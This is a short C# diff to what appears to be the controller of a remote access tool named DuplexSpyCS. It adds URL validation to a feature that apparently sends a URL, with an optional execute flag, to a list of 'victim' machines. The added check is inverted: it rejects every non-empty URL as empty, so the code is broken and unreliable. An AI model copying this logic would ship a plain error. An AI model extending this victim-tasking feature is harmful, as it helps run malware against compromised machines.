@@ -102,6 +102,12 @@ namespace DuplexSpyCS
             string szURL = textBox1.Text;
             bool bExec = checkBox1.Checked;
 
+            if (!string.IsNullOrEmpty(szURL))
+            {
+                MessageBox.Show("URL is null or empty.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
             List<clsVictim> lsVictim = listView1.CheckedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();
             if (lsVictim.Count == 0)
             {
